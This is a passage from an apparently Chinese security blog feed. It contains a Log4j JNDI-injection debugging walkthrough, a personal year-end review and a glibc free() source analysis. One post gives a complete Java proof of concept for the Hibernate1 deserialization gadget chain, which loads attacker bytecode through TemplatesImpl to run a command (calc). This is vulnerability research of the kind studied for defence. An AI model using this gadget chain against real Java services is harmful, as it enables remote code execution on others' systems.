<p>Log4j是<a href="https://baike.baidu.com/item/Apache/8512995?fromModule=lemma_inlink">Apache</a>的一个<a href="https://baike.baidu.com/item/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/3406069?fromModule=lemma_inlink">开源项目</a>，通过使用Log4j，我们可以控制日志信息输送的目的地是<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%8F%B0/2438626?fromModule=lemma_inlink">控制台</a>、文件、GUI组件，甚至是<a href="https://baike.baidu.com/item/%E5%A5%97%E6%8E%A5%E5%8F%A3/10058888?fromModule=lemma_inlink">套接口</a>服务器、NT的事件记录器、<a href="https://baike.baidu.com/item/UNIX?fromModule=lemma_inlink">UNIX</a> <a href="https://baike.baidu.com/item/Syslog?fromModule=lemma_inlink">Syslog</a><a href="https://baike.baidu.com/item/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/966835?fromModule=lemma_inlink">守护进程</a>等；我们也可以控制每一条日志的<a href="https://baike.baidu.com/item/%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F/14456488?fromModule=lemma_inlink">输出格式</a>；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个<a href="https://baike.baidu.com/item/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/286550?fromModule=lemma_inlink">配置文件</a>来灵活地进行配置，而不需要修改应用的代码。</p>
<h1 id="影响版本">影响版本</h1>
<p>2.0且&lt;2.14.1，本文使用的jdk版本为jdk1.8_065。 pom.xml文件如下</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

    &lt;groupId&gt;org.example&lt;/groupId&gt;
    &lt;artifactId&gt;untitled&lt;/artifactId&gt;
    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;

    &lt;properties&gt;
        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;
        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;
        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
            &lt;version&gt;2.14.0&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

&lt;/project&gt;
</code></pre>
<h1 id="分析">分析</h1>
<p>首先运行exp下断点进行调试</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230715195153592.png" alt="image-20230715195153592" loading="lazy"></figure>
<p>会进入到info方法，传入的level是INFO类型，继续跟进，跟进到org/apache/logging/log4j/core/pattern/MessagePatternConverter类的format方法</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230715195429342.png" alt="image-20230715195429342" loading="lazy"></figure>
<p>此时对message进行了判断，判断下标为i和i+1的字符是否是$和{</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230715073428104.png" alt="image-20230715073428104" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230715195525312.png" alt="image-20230715195525312" loading="lazy"></figure>
<p>此时我们的i和i+1个字符分别是$和{，符合要求，一直步入，到org/apache/logging/log4j/core/lookup/StrSubstitutor的resolveVariable方法，其中调用了resolver.lookup</p>
<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230715195735605.png" alt="image-20230715195735605" loading="lazy"></figure>
<p>resolver.lookup内容如下，获取了前缀jndi</p>
<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230715195956541.png" alt="image-20230715195956541" loading="lazy"></figure>
<p>然后进入到lookup.lookup方法 一直执行，最终执行到了jndiManager.lookup,完成jndi注入。</p>
<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230715200143200.png" alt="image-20230715200143200" loading="lazy"></figure>
<p>运行结果如下</p>
<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230715102323452.png" alt="image-20230715102323452" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Hibernate]]></title>
        <id>https://ch0x01e.github.io/post/hello-hisernate/</id>
        <link href="https://ch0x01e.github.io/post/hello-hisernate/">
        </link>
        <updated>2023-07-12T08:43:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="简介">简介</h1>
<p>Hibernate是一个开源免费的、基于 ORM 技术的 Java 持久化框架。通俗地说，Hibernate 是一个用来连接和操作数据库的 Java<br>
框架，它最大的优点是使用了 ORM 技术。</p>
<p>Hibernate 支持几乎所有主流的关系型数据库，只要在配置文件中设置好当前正在使用的数据库，程序员就不需要操心不同数据库之间的差异。</p>
<h1 id="分析">分析</h1>
<h2 id="前置知识">前置知识</h2>
<h3 id="propertyaccessor">PropertyAccessor</h3>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712141411027.png" alt="image-20230712141411027" loading="lazy"></figure>
<h3 id="basicpropertyaccessor">BasicPropertyAccessor</h3>
<p>BasicPropertyAccessor类实现了PropertyAccessor接口，构造方法传入了一个Class，Method和propertyName，然后在get方法中调用了Target的method方法。</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712141501198.png" alt="image-20230712141501198" loading="lazy"></figure>
<p>来看看BasicPropertyAccessor重写的getSetter方法</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712141727409.png" alt="image-20230712141727409" loading="lazy"></figure>
<p>重写后的getSetter方法调用了自身createSetter方法，createSetter方法继续调用getSetterOrNull方法，把结果进行返回。</p>
<p>getSetterOrNull方法如下，调用setterMethod方法返回一个Method实例，然后包装成BasicSetter方法</p>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712142048613.png" alt="image-20230712142048613" loading="lazy"></figure>
<p>在setterMethod方法中，通过调用getDeclareMethods()获取所有方法，然后判断是否以get开头，以get开头的就是getter。</p>
<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712142201278.png" alt="image-20230712142201278" loading="lazy"></figure>
<h3 id="abstractcomponenttuplizer">AbstractComponentTuplizer</h3>
<p>存在getPropertyValue方法，调用getters[i]的get方法</p>
<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712143007627.png" alt="image-20230712143007627" loading="lazy"></figure>
<p>这里的getter数组是org.hibernate.property.Getter类，在上文提到getSetterOrNull方法最后返回的是一个BasicGetter方法，他是实现了Getter接口的</p>
<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712143312660.png" alt="image-20230712143312660" loading="lazy"></figure>
<p>有PojoComponentTuplizer这么一个类，继承了AbstractComponentTuplizer抽象类，在他的getPropertyValues方法调用了父类的getPropertyValues方法</p>
<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712144039596.png" alt="image-20230712144039596" loading="lazy"></figure>
<p>org/hibernate/type/ComponentType类存在getPropertyValues方法的调用</p>
<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712144403879.png" alt="image-20230712144403879" loading="lazy"></figure>
<h3 id="typedvalue">TypedValue</h3>
<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712144814809.png" alt="image-20230712144814809" loading="lazy"></figure>
<p>构造方法调用initTransients()方法</p>
<pre><code class="language-java">private void initTransients() {
   this.hashcode = new ValueHolder&lt;Integer&gt;( new ValueHolder.DeferredInitializer&lt;Integer&gt;() {
      @Override
      public Integer initialize() {
         return value == null ? 0 : type.getHashCode( value );
      }
   } );
}
</code></pre>
<p>initTransients方法把hashcode赋值为一个重写了initialize方法的DeferredInitializer对象</p>
<p>继续来看hashcode方法</p>
<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712151307265.png" alt="image-20230712151307265" loading="lazy"></figure>
<p>返回了hashcode.getValue()，其中hashcode是ValueHolder对象，就是调用ValueHolder.getValue方法</p>
<figure data-type="image" tabindex="12"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712151403792.png" alt="image-20230712151403792" loading="lazy"></figure>
<p>也就是调用了DeferredInitializer的initialize方法，该方法已被重写，方法内容如下</p>
<figure data-type="image" tabindex="13"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712151703097.png" alt="image-20230712151703097" loading="lazy"></figure>
<p>调用<code>type.getHashCode( value )</code></p>
<h3 id="componenttype">ComponentType</h3>
<p>org/hibernate/type/ComponentType 存在getHashCode方法</p>
<figure data-type="image" tabindex="14"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712152405024.png" alt="image-20230712152405024" loading="lazy"></figure>
<p>调用了getPropertyValue方法</p>
<h2 id="hibernate1">Hibernate1</h2>
<p>大致调用链如下:</p>
<p>TypedValue-&gt;hashcode</p>
<p>ValueHolder-&gt;getValue</p>
<p>ValueHolder.DeferredInitializer-&gt;initialize</p>
<p>ComponentType-&gt;getHashCode</p>
<p>ComponentType-&gt;getPropertyValue</p>
<p>AbstractComponentTuplizer-&gt;getPropertyValue</p>
<p>BasicGetter-&gt;get</p>
<p>然后就是用CC3去打字节码</p>
<pre><code class="language-java">

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.mapping.Component;
import org.hibernate.type.Type;
import util.Reflections;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Test {

    public static void main(String[] args) throws Exception {

        Class&lt;?&gt; componentTypeClass             = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);


        //动态创建字节码
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();

        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField(&quot;_name&quot;);
        name.setAccessible(true);
        name.set(templates,&quot;ch1e&quot;);

        Field tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]{bytes});
        Method method = TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;);

        Object getter;
        try {
            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class&lt;?&gt;       getterImpl  = Class.forName(&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;);
            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, method);
        } catch (Exception ignored) {
            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class&lt;?&gt;       basicGetter = Class.forName(&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);
            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(templates.getClass(), method, &quot;outputProperties&quot;);
        }

        // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法

//        Object tuplizer = pojoComponentTuplizerClass.newInstance();

        Object tuplizer = Reflections.createWithoutConstructor(pojoComponentTuplizerClass);


        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
        Field field = abstractComponentTuplizerClass.getDeclaredField(&quot;getters&quot;);
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tuplizer, getters);

        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
//        Object type = componentTypeClass.newInstance();
        Object type = Reflections.createWithoutConstructor(componentTypeClass);

        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
        Field field1 = componentTypeClass.getDeclaredField(&quot;componentTuplizer&quot;);
        field1.setAccessible(true);
        field1.set(type, tuplizer);

        Field field2 = componentTypeClass.getDeclaredField(&quot;propertySpan&quot;);
        field2.setAccessible(true);
        field2.set(type, 1);

        Field field3 = componentTypeClass.getDeclaredField(&quot;propertyTypes&quot;);
        field3.setAccessible(true);
        field3.set(type, new Type[]{(Type) type});

        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
        TypedValue typedValue = new TypedValue((Type) type, null);

        // 创建反序列化用 HashMap
        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
        hashMap.put(typedValue, &quot;su18&quot;);

        // put 到 hashmap 之后再反射写入，防止 put 时触发
        Field valueField = TypedValue.class.getDeclaredField(&quot;value&quot;);
        valueField.setAccessible(true);
        valueField.set(typedValue, templates);

//        serialize(hashMap);
        unserialize(&quot;ser.bin&quot;);
    }
    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws Exception{
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        return o;
    }
}
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230712164255991.png" alt="image-20230712164255991" loading="lazy"></figure>
<h2 id="hibernate2">Hibernate2</h2>
<p>用jdbcRowSetImpl链子打JNDI注入，具体再说吧。要下班了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Life in 2022]]></title>
        <id>https://ch0x01e.github.io/post/life-in-2022/</id>
        <link href="https://ch0x01e.github.io/post/life-in-2022/">
        </link>
        <updated>2022-12-19T14:42:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x00前言">0x00前言</h1>
<p>时间过的真快，马上就是2023年了，大学余额快要到期了，危！！！趁着不想学习的时间写个年终总结吧。短暂的一年里要感谢我的网安领路人十三年，我的男同室友boycc1，我的小弟zard以及弱口令安全实验室和light1ing的几个师傅对我的帮助和支持。最要感谢的还是我的女朋友哈哈，话不多说，直接感谢，女朋友对我的帮助是说不清的多。</p>
<h1 id="0x01竞赛">0x01竞赛</h1>
<p>比赛相关的，也不打多，由于我也不是ctfer，只能找一些大佬带我了。</p>
<p>先说省赛吧，省赛当时也是运气比较好，拿了个省一的，全靠我boycc1神和lyy神带我躺了个十三名。手上还留了点题，不然可能还能再往前一点，不过拿了省一就很满足了</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219221359365.png" alt="image-20221219221359365" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219221404099.png" alt="image-20221219221404099" loading="lazy"></figure>
<p>再来看一个刚打完的，安恒杯，渗透题，这个我zard小弟确实帅。人家还在入口机子找flag呢。我zard小弟都干到第二层内网去了。得分在最后几十分钟都没变，比赛也就3h。享受到了zard在毕业前带给我的福利了。</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219221617229.png" alt="image-20221219221617229" loading="lazy"></figure>
<h1 id="0x02护网北京">0x02护网@北京</h1>
<p>说到护网还是不得不吐槽一句，下次如果没确定什么时候开始真的别喊我们先入场！！！从最初的7.13，到了最后的7.25，而我7.11就已经在北京了！！！我这个怨种，在北京待了五六七天，发烧做了个CT，又先回家了！！！六百多块的高铁票，真是心痛。第一段在北京的时间真的是生不如死，也没想去北京的景点玩玩，心里只有一个状态:想死！！！第二次去，和@白袍住一起，每天通勤一个半小时，过着朝9晚9的生活，第一次护网，没啥经验，全程等吩咐，索性我们的单位攻击比较少，专家组的博士也贼照顾我，也贼平易近人，一点没架子。北京之行比较遗憾的是没和Le1a/pl1rry/A1kaid见面，还是因为发烧！！！到最后晚上也就和yjy小弟吃了个KFC以及在最后和十三年大哥还有一写朋友们吃了顿饭</p>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219222845482.png" alt="image-20221219222845482" loading="lazy"></figure>
<p>以及因为要吃饭路过的天安门，当时和yjy小弟骑了接近一个小时</p>
<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219222904017.png" alt="image-20221219222904017" loading="lazy"></figure>
<p>还有在第一次去北京时，去附近的玉渊谭公园散心，无忧无虑的鸭子，咪咪。</p>
<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219222957486.png" alt="image-20221219222957486" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223002852.png" alt="image-20221219223002852" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223010118.png" alt="image-20221219223010118" loading="lazy"></figure>
<p>另外说一句，国企央企的饭是真的好吃啊</p>
<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219224227767.png" alt="image-20221219224227767" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219224232578.png" alt="image-20221219224232578" loading="lazy"></figure>
<h1 id="0x03考证工作济南">0x03考证/工作@济南</h1>
<p>在年初的时候去大哥十三年的山东公司考了个cisp-pte，总体来说还是蛮简单的pte，考了89分来着，错了个选择题和提权，当时通过文件读取去读文件审计一步步找到上传后的路径还是历历在目的。终于在7月收到了我的pte证书</p>
<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223220271.png" alt="image-20221219223220271" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223224072.png" alt="image-20221219223224072" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223234897.png" alt="image-20221219223234897" loading="lazy"></figure>
<h1 id="0x04学习生活">0x04学习&amp;生活</h1>
<p>今年六月多经历了蛮多的，最主要的还是在6月4日与我的女朋友在一起啦。然后在一起没多久就因为要军训暂时不能见面哈哈。军训时候的云很漂亮。但是云再多也阻挡不了我被晒黑了好几个度</p>
<figure data-type="image" tabindex="14"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223321978.png" alt="image-20221219223321978" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223328709.png" alt="image-20221219223328709" loading="lazy"></figure>
<p>抛开生活，今年在9月的时候终于完成了之前的flag，刷edu月榜，在今年9月份本来edu月榜稳稳的第一，结果没想到第二在最后猛冲了上来，可怜兮兮的我还有没交完的洞，就这么被刷下去了。</p>
<figure data-type="image" tabindex="16"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223548157.png" alt="image-20221219223548157" loading="lazy"></figure>
<p>第一次拿到edu的证书，第一张就是交大，还有个南开的没有发货</p>
<figure data-type="image" tabindex="17"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221219223620979.png" alt="image-20221219223620979" loading="lazy"></figure>
<p>除了edu证书，cnvd真的是多的不能再多了，已经厌倦了。。。如果可以，希望能搞到一个高质量的洞</p>
<h1 id="0x05愿望2023">0x05愿望@2023</h1>
<ul>
<li>第一条当然是和女朋友继续在一起</li>
<li>准备好好考研/找工作，哪个更好选哪个，偏向考研</li>
<li>能够在pwn的学习道路上更顺利</li>
<li>还是要多赚点钱啊。。。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[glibc下free实现原理]]></title>
        <id>https://ch0x01e.github.io/post/glibc-xia-free-shi-xian-yuan-li/</id>
        <link href="https://ch0x01e.github.io/post/glibc-xia-free-shi-xian-yuan-li/">
        </link>
        <updated>2022-12-16T12:47:13.000Z</updated>
        <content type="html"><![CDATA[<h1 id="_int_free函数">_int_free函数</h1>
<p>free函数也和malloc一样，只是经过包装后的，最主要的处理逻辑还是在<code>_int_free</code>函数当中，主要是__libc_free函数调用的<code>_int_free</code>函数</p>
<pre><code class="language-c">__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }

  if (mem == 0)                              /* free(0) has no effect */
    return;

  p = mem2chunk (mem);

  if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
      /* see if the dynamic brk/mmap threshold needs adjusting */
      if (!mp_.no_dyn_threshold
          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold
          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)
        {
          mp_.mmap_threshold = chunksize (p);
          mp_.trim_threshold = 2 * mp_.mmap_threshold;
          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
                      mp_.mmap_threshold, mp_.trim_threshold);
        }
      munmap_chunk (p);
      return;
    }

  ar_ptr = arena_for_chunk (p);
  _int_free (ar_ptr, p, 0);
}
</code></pre>
<h1 id="变量定义和初始化">变量定义和初始化</h1>
<pre><code class="language-c">static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */

  const char *errstr = NULL;
  int locked = 0;

  size = chunksize (p);
</code></pre>
<p>这些在上篇差不多都见过了，bck和fwd就是个中间变量，size就是chunk的大小，等等这些就不说了。</p>
<h1 id="基础检查">基础检查</h1>
<pre><code class="language-c">/* Little security check which won't hurt performance: the
   allocator never wrapps around at the end of the address space.
   Therefore we can exclude some size values which might appear
   here by accident or by &quot;design&quot; from some intruder.  */
if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)
    || __builtin_expect (misaligned_chunk (p), 0))
  {
    errstr = &quot;free(): invalid pointer&quot;;
  errout:
    if (!have_lock &amp;&amp; locked)
      (void) mutex_unlock (&amp;av-&gt;mutex);
    malloc_printerr (check_action, errstr, chunk2mem (p), av);
    return;
  }
/* We know that each chunk is at least MINSIZE bytes in size or a
   multiple of MALLOC_ALIGNMENT.  */
if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))
  {
    errstr = &quot;free(): invalid size&quot;;
    goto errout;
  }

check_inuse_chunk(av, p);
</code></pre>
<p>需要满足以下几个条件</p>
<ul>
<li>p&gt;-size   这里我还是不是很懂</li>
<li>size&gt;MINSIZE   这里需要chunk的大小大于最小值</li>
<li>aligned_OK (size)的结果为true，这里主要是满足每个chunk的size是MALLOC_ALIGNMENT的整数倍</li>
</ul>
<h1 id="尝试把-chunk放入fastbins">尝试把 chunk放入fastbins</h1>
<pre><code class="language-c">  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
   If TRIM_FASTBINS set, don't place chunks
   bordering top into fastbins
      */
      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)
#endif
      ) {

    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)
   || __builtin_expect (chunksize (chunk_at_offset (p, size))
              &gt;= av-&gt;system_mem, 0))
      {
   /* We might not have a lock at this point and concurrent modifications
      of system_mem might have let to a false positive.  Redo the test
      after getting the lock.  */
   if (have_lock
       || ({ assert (locked == 0);
        mutex_lock(&amp;av-&gt;mutex);
        locked = 1;
        chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ
          || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;
         }))
     {
       errstr = &quot;free(): invalid next size (fast)&quot;;
       goto errout;
     }
   if (! have_lock)
     {
       (void)mutex_unlock(&amp;av-&gt;mutex);
       locked = 0;
     }
      }

    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

    set_fastchunks(av);
      //获取被释放的chunk的下标
    unsigned int idx = fastbin_index(size);
      //获取被释放的chunk的指针
    fb = &amp;fastbin (av, idx);

    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
      //定义了两个变量，一个初始化了
    mchunkptr old = *fb, old2;
    unsigned int old_idx = ~0u;
    do
      {
   /* Check that the top of the bin is not the record we are going to add
      (i.e., double free).  */
   if (__builtin_expect (old == p, 0))
     {
       errstr = &quot;double free or corruption (fasttop)&quot;;
       goto errout;
     }
   /* Check that size of fastbin chunk at the top is the same as
      size of the chunk that we are adding.  We can dereference OLD
      only if we have the lock, otherwise it might have already been
      deallocated.  See use of OLD_IDX below for the actual check.  */
   if (have_lock &amp;&amp; old != NULL)
     old_idx = fastbin_index(chunksize(old));
   p-&gt;fd = old2 = old;
      }
    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);

    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))
      {
   errstr = &quot;invalid fastbin entry (free)&quot;;
   goto errout;
      }
  }
</code></pre>
<p>在<code>free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);</code>也就是37行前都是进行一些检查，然后在下面是把chunk放入fastbins，对于<code>set_fastchunks</code>，宏定义为<code>#define set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</code>,就是让malloc_state中的flag中标记是否含有fastbin的标志位为0。然后就是一个do-while循环，这个do-while循环在之前见过差不多的，用到了<code>catomic_compare_and_exchange_val_rel</code>宏函数.</p>
<p>执行do前</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221216203014497.png" alt="image-20221216203014497" loading="lazy"></figure>
<p>执行do后,还没执行while</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221216203259266.png" alt="image-20221216203259266" loading="lazy"></figure>
<p>执行while后</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221216203435491.png" alt="image-20221216203435491" loading="lazy"></figure>
<p>此时chunk_p就已经放到了fastbin当中了</p>
<h1 id="合并相邻空闲chunk">合并相邻空闲chunk</h1>
<p>先做一些必要的检查</p>
<pre><code class="language-c">else if (!chunk_is_mmapped(p)) {
   if (! have_lock) {
     (void)mutex_lock(&amp;av-&gt;mutex);
     locked = 1;
   }

   nextchunk = chunk_at_offset(p, size);

   /* Lightweight tests: check whether the block is already the
      top block.  */
   if (__glibc_unlikely (p == av-&gt;top))
     {
errstr = &quot;double free or corruption (top)&quot;;
goto errout;
     }
   /* Or whether the next chunk is beyond the boundaries of the arena.  */
   if (__builtin_expect (contiguous (av)
        &amp;&amp; (char *) nextchunk
        &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))
     {
errstr = &quot;double free or corruption (out)&quot;;
goto errout;
     }
   /* Or whether the block is actually not marked used.  */
   if (__glibc_unlikely (!prev_inuse(nextchunk)))
     {
errstr = &quot;double free or corruption (!prev)&quot;;
goto errout;
     }

   nextsize = chunksize(nextchunk);
